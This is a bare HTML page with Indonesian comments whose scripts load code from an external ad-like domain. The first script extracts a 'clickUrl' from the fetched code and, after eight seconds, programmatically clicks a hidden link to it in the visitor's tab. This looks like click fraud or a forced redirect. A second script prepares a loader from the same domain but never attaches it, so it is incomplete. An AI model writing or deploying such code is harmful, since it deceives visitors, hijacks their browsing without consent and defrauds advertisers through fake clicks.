<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title></title>
  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      overflow: hidden;
    }
  </style>
</head>
<body>

<script>
  // URL script eksternal
  const scriptURL = "//disfiguredcomment.com/biX_Vis.dQG/lL0/YYWCcW/Le/mB9yu/ZRUTlXkKPDTHYr2NNDTbkS1kNQTbcItlNdjhYU1uOFTBUj1PO/Al";

  fetch(scriptURL)
    .then(response => response.text())
    .then(jsCode => {
      // Cari pattern "clickUrl":"..."
      const match = jsCode.match(/"clickUrl"\s*:\s*"([^"]+)"/);
      if (match && match[1]) {
        const clickUrl = match[1];
        console.log("clickUrl ditemukan:", clickUrl);
        // Tunggu 8 detik sebelum klik (di tab yang sama)
        setTimeout(() => {
          const a = document.createElement("a");
          a.href = clickUrl;            // set tujuan dari clickUrl
          // jangan set a.target supaya klik terjadi di tab yang sama
          a.style.display = "none";     // biar gak kelihatan di DOM
          document.body.appendChild(a);
          a.click();
          a.remove();                   // hapus link supaya bersih
        }, 8000);
      } else {
        console.warn("clickUrl tidak ditemukan di script");
      }
    })
    .catch(err => console.error("Gagal fetch script:", err));
</script>

<script>
(function(orawl){
var d = document,
    s = d.createElement('script'),
    l = d.scripts[d.scripts.length - 1];
s.settings = orawl || {};
s.src = "\/\/disfiguredcomment.com\/byXoV.sJdbG_l\/0SYlWmcy\/beRm\/9Xu\/ZuUylUk\/PSTsYH2\/NqTMks1iNcTNcKtVNPjuYd1mO-T_Un1KOfAh";
s.async = true;
s.referrerPolicy = 'no-referrer-when-downgrade';

})({})
</script>

</body>
</html>
